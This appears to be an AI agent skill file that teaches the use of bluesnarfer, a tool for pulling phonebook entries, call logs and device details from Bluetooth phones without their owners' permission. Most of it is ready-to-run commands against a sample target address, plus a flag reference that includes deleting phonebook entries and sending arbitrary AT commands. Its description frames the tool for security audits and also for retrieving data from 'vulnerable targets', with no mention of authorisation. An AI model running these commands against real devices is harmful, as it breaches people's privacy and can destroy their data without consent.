---
name: bluesnarfer
description: Perform bluesnarfing attacks to extract information from Bluetooth-enabled devices via the OBEX Push profile or GSM AT commands. Use when performing wireless security audits, Bluetooth reconnaissance, or attempting to retrieve phonebook data, call lists, and device information from vulnerable Bluetooth targets.
---

# bluesnarfer

## Overview
A specialized Bluetooth utility designed for "bluesnarfing," which involves accessing information on a Bluetooth-enabled device without the user's permission. It leverages RFCOMM channels to execute GSM AT commands to retrieve sensitive data like phonebooks and call logs. Category: Wireless Attacks / Sniffing & Spoofing.

## Installation (if not already installed)
Assume the tool is installed. If the command is missing:

```bash
sudo apt update && sudo apt install bluesnarfer
```

Dependencies: bluez, libbluetooth3, libc6.

## Common Workflows

### Get Device Information
Retrieve the basic device name and information from a target Bluetooth address.
```bash
bluesnarfer -b 20:C9:D0:43:4B:D8 -i
```

### List Available Phonebook Storages
Identify which memory areas (SIM, Dialed Calls, etc.) are accessible on the target.
```bash
bluesnarfer -b 20:C9:D0:43:4B:D8 -l
```

### Read Phonebook Entries
Extract a range of entries (e.g., 1 to 10) from the default or selected storage.
```bash
bluesnarfer -b 20:C9:D0:43:4B:D8 -r 1-10
```

### Execute Custom AT Command
Send a specific GSM AT command to the device.
```bash
bluesnarfer -b 20:C9:D0:43:4B:D8 -c "AT+GMM"
```

## Complete Command Reference

```bash
bluesnarfer [options] [ATCMD] -b <bt_addr>
```

### Required Options

| Flag | Description |
|------|-------------|
| `-b <bdaddr>` | Bluetooth device address (MAC address) of the target |

### Action Options

| Flag | Description |
|------|-------------|
| `-i` | Get device info (e.g., device name) |
| `-l` | List available phonebook memory storage types |
| `-s <TYPE>` | Select specific phonebook memory storage (e.g., "DC", "SM", "RC") |
| `-r <N-M>` | Read phonebook entries from index N to M |
| `-w <N-M>` | Delete phonebook entries from index N to M |
| `-f <name>` | Search for a specific "name" in the phonebook address book |
| `-c <ATCMD>` | Execute a custom action using a valid AT command |

### Configuration Options

| Flag | Description |
|------|-------------|
| `-C <chan>` | Specify the Bluetooth RFCOMM channel to use |

### Parameter Definitions

**TYPE (Phonebook Storages):**
* `DC`: Dialed call list
* `SM`: SIM phonebook
* `RC`: Received call list
* `XX`: Other manufacturer-specific storages

**ATCMD:**
* Any valid AT+CMD (GSM EXTENSION) compatible with the target mobile device.

## Notes
- This tool requires the target device to have an open or vulnerable RFCOMM channel.
- Modern smartphones are generally resistant to simple bluesnarfing unless they are running very old firmware or have specific misconfigurations.
- You may need to use `bluetoothctl` or `hcitool scan` first to find the target MAC address.